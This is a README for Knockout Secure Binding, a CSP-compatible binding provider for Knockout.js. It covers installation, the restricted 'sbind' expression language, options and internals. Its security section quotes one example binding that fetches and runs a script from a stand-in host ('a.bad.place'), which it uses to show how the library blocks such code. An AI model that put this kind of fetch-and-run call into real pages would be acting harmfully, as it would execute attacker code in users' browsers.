Knockout Secure Binding
=======================

 [![Build Status](https://secure.travis-ci.org/brianmhunt/knockout-secure-binding.png?branch=master)](https://travis-ci.org/brianmhunt/knockout-secure-binding)

<!--  [![Selenium Test Status](https://saucelabs.com/browser-matrix/brianmhunt.svg)](https://saucelabs.com/u/brianmhunt)
 -->

Knockout Secure Binding (KSB) is a binding provider for [Knockout](http://knockoutjs.com) that can be used with a [Content Security Policy](http://www.w3.org/TR/CSP/) that disables `eval` and `new Function`.

This project exists because Knockout's default binder uses `new Function` to
parse bindings, as discussed in [knockout/knockout#903](https://github.com/knockout/knockout/issues/903), which violates the CSP eval prohibition.

Getting started
---

You can get KSB from `bower` with:

```
bower install knockout-secure-binding
```

Using `npm` with:

```
npm install knockout-secure-binding
```

Save this to their respective settings with `--save-dev` or `--save`.

Before applying bindings, KSB is a near drop-in replacement for the standard Knockout binding provider when provided the following options:

```
var options = { globals: window, attribute: "data-bind" };
ko.bindingProvider.instance = new ko.secureBindingsProvider(options);
```

With the above, when you run `ko.applyBindings` the knockout bindings will be parsed by KSB and the respective bindings' `valueAccessors` will be KSB instead of Knockout's own binding engine (which at its core uses the `new Function`, which is barred by CSP's `eval` policy).

When the `attribute` option is not provided the default binding for KSB is `data-sbind`. You can see more options below. By default KSB the `globals` object for KSB is an empty object. The options are described in more detail below.


AMD Loader
---

If you are using an AMD loader, then KSB is exported. Have a look at the example in [knockout-classBindingProvider](https://github.com/rniemeyer/knockout-classBindingProvider)) for an example of making this work.



The `sbind` language
---

The language used in KSB in bindings is a superset of JSON but a subset of Javascript. I will call it the *sbind* language, for convenience.

Sbind language is closer to JSON than Javascript, so it's easier to describe its differences by comparing it to JSON. The sbind language differs from JSON in that:

1. it understands the `undefined` keyword;
2. it looks up variables on `$data` or `$context` or `globals` (in that order);
3. functions can be called (but do not accept arguments);
4. a subset of Javascript expressions are available (see below);
5. observables that are part of expressions are automatically unwrapped for convenience.

KSB provider uses Knockout's built-in bindings, so `text`, `foreach`, and all the others should work as expected. It also works with virtual elements.

This means that the following ought to work as expected:

```
<span data-bind='text: 42'></span>
<span data-bind='text: obs'></span>
<span data-bind='text: obs()'></span>
<span data-bind='text: obs_a() || obs_b()'></span>

<!-- The following are unwrapped because they are part of an expression-->
<span data-bind='text: obs_a || obs_b'></span>

<span data-bind='text: 1 + 2 / (obs % 4)'></span>
<span data-bind='css: { class_name: obs_a <= 400 }'></span>
<a data-bind='click: fn, attr: { href: obs }'></a>
```

The sbind language understands both compound identifiers (e.g. `obs()[1].member()` and expressions (e.g. `a + b * c`)). A full list of operators supported is below. Check out the `spec/knockout_secure_binding_spec.js` for a more thorough list of expressions that work as expected.

There are some restrictions on the sbind language. These include:

- it will not dereference static objects so the following will not work: `{ a: 1 }[obs()]`.
- functions do not accept arguments.


Security implications
---

As mentioned, one cannot use the default Knockout binding provider when a
Content Security Policy prohibits unsafe evaluations (`eval`,
`new Function`, `setTimeout(string)`, `setInterval(string)`).

Prohibiting unsafe evaluations with a Content Security Policy substantially substantially reduces the risk
of a cross-site scripting attack. See for example [Preventing XSS with Content Security Policy](http://benvinegar.github.io/csp-talk-2013/).

By using KSB in place of the regular binding provider one can continue use
Knockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).

Independent of a Content Security Policy, KSB prevents the execution of arbitrary code in a Knockout binding. A malicious script such as
`text: $.getScript('http://a.bad.place/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script
will not execute in KSB because:

1. The `$` is a global, and unless explicitly added to the binding context it will not be accessible;
2. Functions in KSB do not accept arguments;
3. Your CSP should prevent accessing the host `a.bad.place`.

The `data-sbind` differs from `data-bind` as follows:


Options
---

The `ko.secureBindingsProvider` constructor accepts one argument,
an object that may contain the following options:


| Option | Default | Description |
| ---: | :---: | :--- |
| attribute | `data-sbind` | The binding value on attributes |
| globals | `{}` | Where variables are looked up if not on `$context` or `$data` |
| bindings | `ko.bindingHandlers` | The bindings KO will use with KSB |
| noVirtualElements | `false` | Set to `true` to disable virtual element binding |

For example, `ko.secureBindingsProvider({ globals: { "$": jQuery }})`.


Expressions
---

KSB supports some [Javascript operations](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#Table), namely:

| Type | Operators  |
| ---: | :-------- |
| Negation | `!` `!!`        |
| Multiplication | `*` `/` `%`      |
| Addition | `+` `-` |
| Comparison | `<` `<=` `>` `>=` |
| Equality | `==` `!=` `===` `!==` |
| Logic | `&&` <code>&#124;&#124;</code> |
| Bitwise | `&` `^` <code>&#124;</code> |

Notes:

1. Observables in expressions are unwrapped as a convenience so `text: a > b` will unwrap both `a` and `b` if they are observables. It will not unwrap for membership i.e. `a.property` will return the `property` of the observable (`a.property`), not the property of the observable's unwrapped value (`ko.unwrap(a).property`). If the varaible referred to is not part of an expression (e.g. `text: a`) then the variable will not be unwrapped before being passed to a binding. This is the expected behaviour.

2. While negation and double-negation are supported, trible negation (`!!!`) will not work as expected.


Tests
---

You can run a standalone server with `npm test`. It will
print the URL for the server to the console. You can connect
to it with any browser and the tests will be executed.

Automated tests with `chromedriver` can be initiated with
`npm start`.

You will need to independently start `chromedriver` with
`chromedriver --url-base=/wd/hub --port=4445`.


Requires
---

Knockout 2.0+

KSB may use ES5 functions, namely:

- `Object.defineProperty`


How it works
---

KSB runs a one-pass parser on the bindings’ text and generates an array of identifier dereferences and a lazily generated syntax tree of expressions.

The identifier dereferences for something like `<span data-bind='x: a.b["c"]()'></span>` will look like this:

```
[
  function (x) { return x['b'] },
  function (x) { return x['c'] },
  function (x) { return x() },
]
```

When (if) the `x` binding calls its `valueAccessor` argument the identifier will be returned as the root value (`a`, presumably an object) then each of the dereference functions.

The expression tree is straightforward and for something like `1 + 4 - 8` it looks like this:

```
1     4
 \   /
  (+)     8
    \    /
     (-)
```

It should be reasonably performant, but I would not be surprised if it were a magnitude slower than native bindings for complex expressions. That said I have done no experiments to compare. There is certainly some room for improving the expression executions.


LICENSE
---

The MIT License (MIT)

Copyright (c) 2013–2014 Brian M Hunt

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.

